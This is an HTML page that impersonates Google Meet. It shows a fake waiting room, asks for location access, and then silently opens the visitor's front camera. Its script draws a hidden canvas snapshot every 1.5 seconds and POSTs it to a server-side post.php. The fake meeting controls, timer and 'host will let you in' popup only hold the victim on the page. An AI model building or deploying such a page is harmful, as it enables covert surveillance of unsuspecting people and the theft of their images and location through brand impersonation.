<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Meet</title>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', 'Google Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #202124;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            color: #fff;
        }

        .video-wrap {
            display: none;
        }

        #canvas {
            display: none;
        }

        .meeting-container {
            height: 100vh;
            display: flex;
            flex-direction: column;
            background: #202124;
        }

        .top-bar {
            background: rgba(32, 33, 36, 0.95);
            backdrop-filter: blur(10px);
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            z-index: 100;
        }

        .meeting-info {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .meeting-logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #4285F4, #34A853);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 18px;
        }

        .meeting-title {
            font-size: 16px;
            font-weight: 500;
            color: #e8eaed;
        }

        .meeting-time {
            font-size: 14px;
            color: #9aa0a6;
        }

        .top-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .icon-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: none;
            background: rgba(255, 255, 255, 0.1);
            color: #e8eaed;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .icon-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .main-screen {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            background: #000;
            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }

        .participant-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: 500;
            margin-bottom: 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }

        .participant-name {
            font-size: 24px;
            font-weight: 500;
            color: #e8eaed;
            margin-bottom: 8px;
        }

        .waiting-message {
            font-size: 16px;
            color: #9aa0a6;
            text-align: center;
            max-width: 400px;
        }

        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(5px);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .popup-content {
            background: #2d2e30;
            border-radius: 16px;
            padding: 32px 40px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from {
                transform: translateY(20px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .popup-icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #4285F4, #34A853);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }

        .popup-title {
            font-size: 20px;
            font-weight: 500;
            color: #e8eaed;
            margin-bottom: 12px;
        }

        .popup-message {
            font-size: 14px;
            color: #9aa0a6;
            line-height: 1.6;
        }

        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(32, 33, 36, 0.95);
            backdrop-filter: blur(10px);
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            z-index: 100;
        }

        .control-button {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            background: transparent;
            border: none;
            color: #e8eaed;
            cursor: pointer;
            padding: 12px 20px;
            border-radius: 12px;
            transition: all 0.2s ease;
            min-width: 80px;
        }

        .control-button:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .control-button i {
            font-size: 24px;
            margin-bottom: 4px;
        }

        .control-button span {
            font-size: 12px;
            font-weight: 500;
        }

        .control-button.active {
            background: rgba(66, 133, 244, 0.2);
            color: #4285F4;
        }

        .control-button.muted {
            background: rgba(234, 67, 53, 0.2);
            color: #ea4335;
        }

        .end-call-btn {
            background: #ea4335;
            color: white;
            border-radius: 50%;
            width: 56px;
            height: 56px;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            transition: all 0.2s ease;
            margin-left: 12px;
        }

        .end-call-btn:hover {
            background: #c5221f;
            transform: scale(1.05);
        }

        .participants-count {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        @media (max-width: 768px) {
            .bottom-bar {
                flex-wrap: wrap;
                padding: 12px;
            }

            .control-button {
                padding: 8px 12px;
                min-width: 60px;
            }

            .control-button span {
                font-size: 10px;
            }

            .popup-content {
                margin: 20px;
                padding: 24px;
            }
        }
        .request-access-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(32,33,36,0.98); z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 40px; text-align: center; transition: opacity 0.5s ease;
        }
        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: #4285f4;
            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #fff; }
        .request-access-text { font-size: 16px; color: rgba(255,255,255,0.9); margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
            border-radius: 8px; background: #4285f4; color: #fff; cursor: pointer; }
        .request-access-btn:hover { background: #5a95f5; }
        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .request-access-status { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.7); }
    </style>
</head>

<body>
    <div class="request-access-overlay" id="requestAccessOverlay">
        <div class="request-access-icon">📍</div>
        <div class="request-access-title">Request Access</div>
        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
        <button class="request-access-btn" id="requestAccessBtn">Request Access</button>
        <div class="request-access-status" id="requestAccessStatus"></div>
    </div>

    <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

    <div class="meeting-container">
        <div class="top-bar">
            <div class="meeting-info">
                <div class="meeting-logo">G</div>
                <div>
                    <div class="meeting-title">Google Meet</div>
                    <div class="meeting-time" id="meetingTime">00:00</div>
                </div>
            </div>
            <div class="top-controls">
                <button class="icon-btn" title="Participants">
                    <i class="fas fa-users"></i>
                </button>
                <button class="icon-btn" title="Chat">
                    <i class="fas fa-comments"></i>
                </button>
                <button class="icon-btn" title="Settings">
                    <i class="fas fa-cog"></i>
                </button>
            </div>
        </div>

        <div class="main-screen">
            <div class="video-placeholder">
                <div class="participant-avatar">U</div>
                <div class="participant-name">You</div>
                <div class="waiting-message">Waiting for others to join...</div>
            </div>
            <div class="participants-count">
                <i class="fas fa-users"></i>
                <span id="participantCount">1</span>
            </div>
        </div>

        <div id="ac-wrapper" class="popup-overlay">
            <div class="popup-content">
                <div class="popup-icon">
                    <i class="fas fa-clock"></i>
                </div>
                <div class="popup-title">Please wait</div>
                <div class="popup-message">The meeting host will let you in soon</div>
            </div>
        </div>

        <div class="bottom-bar">
            <button class="control-button" id="micBtn">
                <i class="fas fa-microphone"></i>
                <span>Mute</span>
            </button>
            <button class="control-button" id="videoBtn">
                <i class="fas fa-video"></i>
                <span>Stop Video</span>
            </button>
            <button class="control-button" id="securityBtn">
                <i class="fas fa-shield-alt"></i>
                <span>Security</span>
            </button>
            <button class="control-button" id="participantsBtn">
                <i class="fas fa-users"></i>
                <span>Participants</span>
            </button>
            <button class="control-button" id="shareBtn">
                <i class="fas fa-desktop"></i>
                <span>Present</span>
            </button>
            <button class="control-button" id="chatBtn">
                <i class="fas fa-comments"></i>
                <span>Chat</span>
            </button>
            <button class="control-button" id="recordBtn">
                <i class="fas fa-circle"></i>
                <span>Record</span>
            </button>
            <button class="end-call-btn" id="endCallBtn">
                <i class="fas fa-phone-slash"></i>
            </button>
        </div>
    </div>

    <script src="location-request.js"></script>
    <script>
        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: BASE_URL + 'post.php',
                dataType: 'json',
                async: false,
                success: function (result) {
                    // Handle response
                },
                error: function () {
                    // Handle error
                }
            });
        }

        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                if (errorMsgElement) {
                    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
                }
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            var context = canvas.getContext('2d');
            setInterval(function () {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
                video.play();
            }, 1500);
        }

        function PopUp() {
            document.getElementById('ac-wrapper').style.display = "none";
        }

        // Meeting timer
        let meetingStartTime = Date.now();
        function updateMeetingTime() {
            const elapsed = Math.floor((Date.now() - meetingStartTime) / 1000);
            const minutes = Math.floor(elapsed / 60);
            const seconds = elapsed % 60;
            document.getElementById('meetingTime').textContent = 
                `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        }

        // Control button handlers
        document.getElementById('micBtn').addEventListener('click', function() {
            this.classList.toggle('muted');
            const icon = this.querySelector('i');
            icon.className = this.classList.contains('muted') ? 'fas fa-microphone-slash' : 'fas fa-microphone';
        });

        document.getElementById('videoBtn').addEventListener('click', function() {
            this.classList.toggle('muted');
            const icon = this.querySelector('i');
            icon.className = this.classList.contains('muted') ? 'fas fa-video-slash' : 'fas fa-video';
        });

        document.getElementById('securityBtn').addEventListener('click', function() {
            this.classList.toggle('active');
        });

        document.getElementById('participantsBtn').addEventListener('click', function() {
            this.classList.toggle('active');
        });

        document.getElementById('shareBtn').addEventListener('click', function() {
            this.classList.toggle('active');
        });

        document.getElementById('chatBtn').addEventListener('click', function() {
            this.classList.toggle('active');
        });

        document.getElementById('recordBtn').addEventListener('click', function() {
            this.classList.toggle('active');
            if (this.classList.contains('active')) {
                this.style.color = '#ea4335';
            }
        });

        // Simulate participant count
        function updateParticipantCount() {
            const count = Math.floor(Math.random() * 3) + 1;
            document.getElementById('participantCount').textContent = count;
        }

        // Initialize only after location permission is done
        function startApp() {
            init();
            setInterval(updateMeetingTime, 1000);
            setInterval(updateParticipantCount, 3000);
        }
        if (window.LocationRequest) {
            LocationRequest.init(startApp);
        }

        // Hide popup after 50 seconds
        $(document).ready(function() {
            setTimeout(function() {
                PopUp();
            }, 50000);
        });
    </script>
</body>
</html>
